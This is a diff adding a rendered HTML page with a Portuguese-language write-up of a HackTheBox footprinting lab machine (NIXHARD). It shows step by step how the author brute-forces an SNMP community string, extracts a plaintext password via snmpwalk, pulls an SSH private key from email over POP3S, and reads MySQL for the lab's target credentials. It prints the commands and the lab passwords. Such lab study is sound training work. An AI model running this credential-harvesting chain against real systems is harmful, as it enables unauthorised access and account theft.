+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🐚 Shell e Pós-Acesso">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#etapa-4-ssh-como-tom-com-a-chave-exfiltrada" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 4 — SSH como tom com a chave exfiltrada
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-5-bash_history-pista-do-mysql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 5 — .bash_history: pista do MySQL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#etapa-6-mysql-credenciais-do-htb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Etapa 6 — MySQL: credenciais do HTB
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚩 Flags
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo-tecnico" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📖 Resumo Técnico
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#licoes-aprendidas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 Lições Aprendidas
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="footprinting-tests-hard">🏴️ Footprinting Tests - Hard</h1>
+<blockquote>
+<p><strong>Dificuldade:</strong> Hard | <strong>SO:</strong> Linux | <strong>Plataforma:</strong> CPTS — Estudo de Footprinting</p>
+</blockquote>
+<div class="admonition info">
+<p class="admonition-title">Sobre esta página</p>
+<p>Writeup do laboratório de footprinting (máquina hard) do HackTheBox. O servidor
+mais protegido do escopo: sem vetor óbvio no TCP, foi necessário <strong>enumerar UDP</strong>,
+quebrar a <strong>community string de SNMP</strong>, extrair credenciais e chave SSH, e
+pivotar para o <strong>MySQL</strong> até obter as credenciais do usuário <code>HTB</code>.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Sobre os IPs</p>
+<p>O alvo foi reiniciado durante o estudo, então o IP muda entre os blocos de
+saída (<code>10.129.202.20</code>, <code>10.129.62.80</code>). As saídas foram mantidas exatamente
+como apareceram no terminal.</p>
+</div>
+<hr />
+<h2 id="informacoes-gerais">📋 Informações Gerais</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Hostname</strong></td>
+<td style="text-align: left;"><code>NIXHARD</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>IP</strong></td>
+<td style="text-align: left;"><code>10.129.202.20</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>SO</strong></td>
+<td style="text-align: left;">Linux — Ubuntu (kernel 5.4.0-90-generic x86_64)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Dificuldade</strong></td>
+<td style="text-align: left;">Hard</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Plataforma / Módulo</strong></td>
+<td style="text-align: left;">CPTS — Footprinting</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Domínio interno</strong></td>
+<td style="text-align: left;"><code>inlanefreight.htb</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Data</strong></td>
+<td style="text-align: left;">25/06/2026</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Status</strong></td>
+<td style="text-align: left;">Finalizado</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition abstract">
+<p class="admonition-title">Objetivo</p>
+<p>Terceiro e último servidor do escopo, o mais protegido dos três. Exige encadear
+informações de múltiplos serviços para obter acesso. Como prova de
+comprometimento, é necessário recuperar as credenciais do usuário <code>HTB</code>.</p>
+</div>
+<hr />
+<h2 id="enumeracao-inicial">🔍 Enumeração Inicial</h2>
+<h3 id="portas-e-servicos-encontrados">Portas e Serviços Encontrados</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Porta</th>
+<th style="text-align: left;">Serviço</th>
+<th style="text-align: left;">Versão / Banner</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">22/tcp</td>
+<td style="text-align: left;">ssh</td>
+<td style="text-align: left;">OpenSSH</td>
+</tr>
+<tr>
+<td style="text-align: left;">110/tcp</td>
+<td style="text-align: left;">pop3</td>
+<td style="text-align: left;">—</td>
+</tr>
+<tr>
+<td style="text-align: left;">143/tcp</td>
+<td style="text-align: left;">imap</td>
+<td style="text-align: left;">—</td>
+</tr>
+<tr>
+<td style="text-align: left;">993/tcp</td>
+<td style="text-align: left;">imaps</td>
+<td style="text-align: left;">—</td>
+</tr>
+<tr>
+<td style="text-align: left;">995/tcp</td>
+<td style="text-align: left;">pop3s</td>
+<td style="text-align: left;">—</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>161/udp</strong></td>
+<td style="text-align: left;"><strong>snmp</strong></td>
+<td style="text-align: left;"><strong>net-snmp SNMPv3 server</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="comandos-de-enumeracao">Comandos de Enumeração</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Scan TCP inicial</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span>-Pn<span class="w"> </span>-n<span class="w"> </span>--disable-arp-ping<span class="w"> </span>-D<span class="w"> </span>RND:5<span class="w"> </span><span class="m">10</span>.129.202.20
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># Sem vetor óbvio no TCP → scan UDP nas portas mais comuns</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">20</span><span class="w"> </span>-oN<span class="w"> </span>nmap-udp.txt<span class="w"> </span><span class="m">10</span>.129.202.20
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c1"># Confirmação do serviço SNMP</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sU<span class="w"> </span>-Pn<span class="w"> </span>-p161<span class="w"> </span>--script<span class="w"> </span>snmp-info<span class="w"> </span><span class="m">10</span>.129.62.80
+</code></pre></div>
+<h3 id="saida-relevante-evidencia">Saída Relevante (evidência)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># --- TCP ---</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="m">22</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssh
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="m">110</span>/tcp<span class="w"> </span>open<span class="w">  </span>pop3
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="m">143</span>/tcp<span class="w"> </span>open<span class="w">  </span>imap
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="m">993</span>/tcp<span class="w"> </span>open<span class="w">  </span>imaps
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="m">995</span>/tcp<span class="w"> </span>open<span class="w">  </span>pop3s
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c1"># --- UDP (NIXHARD) ---</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>PORT<span class="w">      </span>STATE<span class="w">         </span>SERVICE
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="m">161</span>/udp<span class="w">   </span>open<span class="w">          </span>snmp
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="c1"># --- snmp-info ---</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>PORT<span class="w">    </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="m">161</span>/udp<span class="w"> </span>open<span class="w">  </span>snmp<span class="w">    </span>net-snmp<span class="p">;</span><span class="w"> </span>net-snmp<span class="w"> </span>SNMPv3<span class="w"> </span>server
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="p">|</span><span class="w"> </span>snmp-info:
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="p">|</span><span class="w">   </span>enterprise:<span class="w"> </span>net-snmp
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="p">|</span><span class="w">   </span>engineIDData:<span class="w"> </span>5b99e75a10288b6100000000
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="p">|</span><span class="w">   </span>snmpEngineBoots:<span class="w"> </span><span class="m">10</span>
+</code></pre></div>
+<h3 id="descobertas">Descobertas</h3>
+<ul>
+<li>[x] Caixa de e-mail exposta (POP3/IMAP/POP3S/IMAPS), mas <strong>sem vetor direto</strong> no TCP</li>
+<li>[x] <code>commonName=NIXHARD</code> recuperado dos certificados → hostname do alvo</li>
+<li>[x] <strong>SNMP (161/udp)</strong> aberto — o vetor que destravou a máquina, só visível no scan UDP</li>
+</ul>
+<hr />
+<h2 id="tecnicas-utilizadas">🎯 Técnicas Utilizadas</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">#</th>
+<th style="text-align: left;">Técnica</th>
+<th style="text-align: left;">Onde / Como foi aplicada</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;">1</td>
+<td style="text-align: left;">Enumeração UDP</td>
+<td style="text-align: left;"><code>nmap -sU</code> revela SNMP (161) após o TCP não dar vetor</td>
+</tr>
+<tr>
+<td style="text-align: left;">2</td>
+<td style="text-align: left;">Brute force de community string</td>
+<td style="text-align: left;"><code>onesixtyone</code> + wordlist de discovery SNMP → community <code>backup</code></td>
+</tr>
+<tr>
+<td style="text-align: left;">3</td>
+<td style="text-align: left;">Extração de informação via SNMP</td>
+<td style="text-align: left;"><code>snmpwalk -c backup</code> vaza senha do <code>tom</code> nos argumentos de processo</td>
+</tr>
+<tr>
+<td style="text-align: left;">4</td>
+<td style="text-align: left;">Acesso a webmail por POP3S</td>
+<td style="text-align: left;"><code>curl pop3s://</code> lê e-mail do <code>tom</code> contendo chave SSH privada</td>
+</tr>
+<tr>
+<td style="text-align: left;">5</td>
+<td style="text-align: left;">Reuso de chave SSH</td>
+<td style="text-align: left;">Login como <code>tom</code> com a <code>id_rsa</code> exfiltrada do e-mail</td>
+</tr>
+<tr>
+<td style="text-align: left;">6</td>
+<td style="text-align: left;">Pivot para MySQL</td>
+<td style="text-align: left;"><code>.bash_history</code> indica uso do MySQL → <code>SELECT * FROM users</code> → senha do <code>HTB</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="exploracao-acesso-inicial">🚀 Exploração / Acesso Inicial</h2>
+<h3 id="vetor-de-entrada">Vetor de Entrada</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Vetor</strong></td>
+<td style="text-align: left;">SNMP (161/udp) → credenciais + chave SSH → MySQL</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Falha explorada</strong></td>
+<td style="text-align: left;">Community string fraca (<code>backup</code>) expondo dados sensíveis via SNMP</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Ferramentas</strong></td>
+<td style="text-align: left;">nmap, onesixtyone, snmpwalk, curl, ssh, mysql</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Acesso obtido como</strong></td>
+<td style="text-align: left;"><code>tom</code> (SSH)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="processo">Processo</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>1. TCP sem vetor → scan UDP → SNMP (161) aberto
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>2. Brute force de community string com onesixtyone → &quot;backup&quot;
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>3. snmpwalk -c backup → senha do tom (NMds732Js2761) nos args de /opt/tom-recovery.sh
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>4. SSH direto com a senha falha → ler e-mail do tom via POP3S
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>5. E-mail contém id_rsa (chave SSH privada) → login como tom
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>6. .bash_history mostra &quot;mysql -u tom -p&quot; → entrar no MySQL
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>7. SELECT * FROM users → registro 150 → credenciais do HTB
+</code></pre></div>
+<hr />
+<h3 id="etapa-1-snmp-brute-force-da-community-string">Etapa 1 — SNMP: brute force da community string</h3>
+<p>Sem ferramentas conhecidas para SNMP, usei o <code>onesixtyone</code> com uma wordlist de
+discovery, que encontrou a community string <strong><code>backup</code></strong>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>onesixtyone<span class="w"> </span>-c<span class="w"> </span>/usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt<span class="w"> </span><span class="m">10</span>.129.62.80
+</code></pre></div>
+<p><img alt="Brute force de community string SNMP com onesixtyone" src="../../img/footprinting-tests-hard/01-snmp-bruteforce.png" /></p>
+<h3 id="etapa-2-snmpwalk-senha-do-tom-vazada">Etapa 2 — <code>snmpwalk</code>: senha do <code>tom</code> vazada</h3>
+<p>Com a community <code>backup</code>, o <code>snmpwalk</code> revelou a tabela de processos em execução,
+incluindo <code>/opt/tom-recovery.sh</code> com a <strong>senha do <code>tom</code> em texto puro</strong> nos
+argumentos:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>snmpwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>backup<span class="w"> </span><span class="m">10</span>.129.62.80
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;/opt/tom-recovery.sh&quot;</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;tom NMds732Js2761&quot;</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>...
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>iso.3.6.1.2.1.1.4.0<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;Admin &lt;tech@inlanefreight.htb&gt;&quot;</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>iso.3.6.1.2.1.1.5.0<span class="w"> </span><span class="o">=</span><span class="w"> </span>STRING:<span class="w"> </span><span class="s2">&quot;NIXHARD&quot;</span>
+</code></pre></div>
+<p><img alt="snmpwalk com a community backup revela a senha do tom" src="../../img/footprinting-tests-hard/02-snmpwalk-tom-creds.png" /></p>
+<div class="admonition success">
+<p class="admonition-title">Credenciais obtidas (SNMP)</p>
+<ul>
+<li><strong>Usuário:</strong> <code>tom</code></li>
+<li><strong>Senha:</strong> <code>NMds732Js2761</code></li>
+<li><strong>Script suspeito:</strong> <code>/opt/tom-recovery.sh</code></li>
+</ul>
+</div>
+<h3 id="etapa-3-pop3s-e-mail-do-tom-com-a-chave-ssh">Etapa 3 — POP3S: e-mail do <code>tom</code> com a chave SSH</h3>
+<div class="admonition warning">
+<p class="admonition-title">Tentativa que NÃO funcionou</p>
+<p>O login direto via <strong>SSH</strong> com a senha <code>NMds732Js2761</code> falhou. O acesso à
+caixa de e-mail por POP3S também encerrava a conexão ao tentar ler pela sessão
+interativa — a solução foi requisitar a mensagem diretamente com <code>curl</code>.</p>
+</div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>curl<span class="w"> </span>-k<span class="w"> </span><span class="s2">&quot;pop3s://10.129.62.80/1&quot;</span><span class="w"> </span>--user<span class="w"> </span><span class="s2">&quot;tom:NMds732Js2761&quot;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>From:<span class="w"> </span><span class="o">[</span>Admin<span class="o">]</span><span class="w"> </span>&lt;tech@inlanefreight.htb&gt;
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>To:<span class="w"> </span>&lt;tom@inlanefreight.htb&gt;
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>Subject:<span class="w"> </span>KEY
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>-----BEGIN<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>...<span class="w"> </span><span class="o">(</span>chave<span class="w"> </span>OpenSSH<span class="w"> </span>privada<span class="w"> </span><span class="k">do</span><span class="w"> </span>tom<span class="w"> </span>—<span class="w"> </span>truncada<span class="o">)</span><span class="w"> </span>...
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>-----END<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
+</code></pre></div>
+<p><img alt="Leitura do e-mail do tom via POP3S com a chave SSH" src="../../img/footprinting-tests-hard/03-pop3s-tom-email.png" /></p>
+<div class="admonition success">
+<p class="admonition-title">Chave obtida (POP3S)</p>
+<p>Chave SSH privada (<code>id_rsa</code>) do <code>tom</code>, enviada por e-mail pelo <code>Admin</code>.</p>
+</div>
+<hr />
+<h2 id="shell-e-pos-acesso">🐚 Shell e Pós-Acesso</h2>
+<h3 id="etapa-4-ssh-como-tom-com-a-chave-exfiltrada">Etapa 4 — SSH como <code>tom</code> com a chave exfiltrada</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Salvar a chave do e-mail como id_rsa</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>tom@10.129.62.80
+</code></pre></div>
+<p><img alt="Acesso SSH como tom — leitura do .mysql_history" src="../../img/footprinting-tests-hard/04-ssh-access-tom.png" /></p>
+<p>Acesso obtido como <code>tom@NIXHARD</code>. O <code>.mysql_history</code> já indicava consultas à
+tabela <code>users</code>.</p>
+<h3 id="etapa-5-bash_history-pista-do-mysql">Etapa 5 — <code>.bash_history</code>: pista do MySQL</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>cat<span class="w"> </span>.bash_history
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>mysql<span class="w"> </span>-u<span class="w"> </span>tom<span class="w"> </span>-p
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>ssh-keygen<span class="w"> </span>-t<span class="w"> </span>rsa<span class="w"> </span>-b<span class="w"> </span><span class="m">4096</span>
+</code></pre></div>
+<p><img alt="Conteúdo do .bash_history do tom" src="../../img/footprinting-tests-hard/05-bash-history.png" /></p>
+<div class="admonition tip">
+<p class="admonition-title">Pista</p>
+<p>O histórico mostra que o <code>tom</code> acessa o <strong>MySQL</strong> localmente (<code>mysql -u tom -p</code>)
+— o próximo passo é entrar no banco reutilizando a senha do <code>tom</code>.</p>
+</div>
+<h3 id="etapa-6-mysql-credenciais-do-htb">Etapa 6 — MySQL: credenciais do <code>HTB</code></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>mysql<span class="w"> </span>-u<span class="w"> </span>tom<span class="w"> </span>-p<span class="w">   </span><span class="c1"># senha: NMds732Js2761</span>
+</code></pre></div>
+<p><img alt="Login bem-sucedido no MySQL como tom" src="../../img/footprinting-tests-hard/06-mysql-login-tom.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">show</span><span class="w"> </span><span class="n">databases</span><span class="p">;</span>
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">use</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+</code></pre></div>
+<p><img alt="Navegação no MySQL em busca do usuário HTB" src="../../img/footprinting-tests-hard/07-mysql-navigation.png" /></p>
+<p><img alt="Tabela users com os registros de credenciais" src="../../img/footprinting-tests-hard/08-mysql-users-table.png" /></p>
+<p>Entre os registros, o usuário <code>HTB</code> (id <code>150</code>) com a senha-alvo:</p>
+<p><img alt="Credenciais do usuário HTB encontradas" src="../../img/footprinting-tests-hard/09-htb-password-found.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>150 | HTB | cr3n4o7rzse7rzhnckhssncif7ds
+</code></pre></div>
+<div class="admonition success">
+<p class="admonition-title">Objetivo alcançado (tabela users — MySQL)</p>
+<ul>
+<li><strong>Usuário:</strong> <code>HTB</code></li>
+<li><strong>Senha:</strong> <code>cr3n4o7rzse7rzhnckhssncif7ds</code></li>
+</ul>
+</div>
+<hr />
+<h2 id="flags">🚩 Flags</h2>
+<ul>
+<li>[x] Credenciais do usuário <code>HTB</code> capturadas</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Credencial</th>
+<th style="text-align: left;">Local</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>HTB:cr3n4o7rzse7rzhnckhssncif7ds</code></td>
+<td style="text-align: left;">Tabela <code>users</code> (MySQL), registro <code>150</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="resumo-tecnico">📖 Resumo Técnico</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Campo</th>
+<th style="text-align: left;">Valor</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Causa raiz</strong></td>
+<td style="text-align: left;">Community string SNMP fraca (<code>backup</code>) expondo credenciais via argumentos de processo</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Cadeia de ataque</strong></td>
+<td style="text-align: left;">UDP/SNMP → community <code>backup</code> → senha do <code>tom</code> → e-mail POP3S → chave SSH → shell <code>tom</code> → MySQL → creds <code>HTB</code></td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Acesso final</strong></td>
+<td style="text-align: left;"><code>tom</code> (SSH) + credenciais do <code>HTB</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="licoes-aprendidas">💡 Lições Aprendidas</h2>
+<ul>
+<li><strong>O que funcionou:</strong> não parar no TCP. O vetor inteiro dependia de <strong>enumerar UDP</strong>
+  e quebrar o SNMP — sem isso a máquina parecia sem entrada.</li>
+<li><strong>O que atrasou:</strong> insistir no SSH com a senha do <code>tom</code> (falhava) e tentar ler o
+  e-mail pela sessão POP3S interativa; o caminho era <code>curl pop3s://.../1</code>.</li>
+<li><strong>Comandos para revisar depois:</strong> <code>onesixtyone</code> para community strings,
+  <code>snmpwalk -v2c -c &lt;community&gt;</code> para extração, <code>curl pop3s://</code> para ler e-mails.</li>
+<li><strong>Técnicas para estudar melhor:</strong> SNMP frequentemente expõe argumentos de
+  processo com senhas em texto puro; sempre revisar <code>~/.bash_history</code> e
+  <code>~/.mysql_history</code> após obter shell.</li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "navigation.top", "search.highlight", "content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
